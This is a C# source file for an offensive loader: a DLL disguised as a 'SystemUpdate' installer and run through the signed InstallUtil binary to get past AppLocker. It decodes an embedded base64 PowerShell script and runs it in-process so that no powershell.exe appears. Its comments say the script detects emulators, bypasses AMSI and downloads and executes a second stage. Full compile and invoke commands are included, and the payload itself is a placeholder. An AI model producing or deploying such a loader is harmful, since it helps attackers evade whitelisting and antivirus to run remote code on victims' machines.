// bypass_dll.cs — .NET DLL designed to be invoked via InstallUtil.
//
// Purpose: bypass AppLocker when PowerShell.exe is blocked or when unsigned
// executables cannot run from user-writable paths. InstallUtil.exe is a
// Microsoft-signed binary and is whitelisted by default AppLocker rules.
// When invoked with /U, it runs the Uninstall method below in the current
// user's context, without spawning powershell.exe.
//
// Compile:
//   csc /target:library /out:Update.dll ^
//       /r:System.Configuration.Install.dll ^
//       /r:"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" ^
//       bypass_dll.cs
//
// Invoke:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe ^
//       /logfile= /LogToConsole=false /U Update.dll
//
// The Installer class only runs Uninstall when /U is specified. No admin
// required for /U. Install writes to the registry and is intentionally not
// implemented.

using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace SystemUpdate
{
    [System.ComponentModel.RunInstaller(true)]
    public class UpdateInstaller : Installer
    {
        // Base64 (UTF-16LE) encoded script that:
        //   1. Runs emulator detection
        //   2. Runs non-emulated API check
        //   3. Applies the AMSI bypass
        //   4. Downloads and executes run.txt
        //
        // Regenerate with:
        //   python3 tools/encode_poller.py shared/run_txt_launcher.ps1
        // where run_txt_launcher.ps1 is the compiled bootstrap script.
        private const string B64 = "PASTE_BASE64_BLOB_HERE";

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            // Decode the script
            byte[] raw;
            try { raw = Convert.FromBase64String(B64); }
            catch { return; }

            string script = System.Text.Encoding.Unicode.GetString(raw);

            // Run inside a custom runspace — no powershell.exe child process.
            // The runspace is created in-process via System.Management.Automation.dll.
            Runspace rs = null;
            try
            {
                rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;
                    ps.AddScript(script);
                    ps.Invoke();
                }
            }
            catch { }
            finally
            {
                if (rs != null) { try { rs.Close(); } catch { } }
            }
        }
    }
}
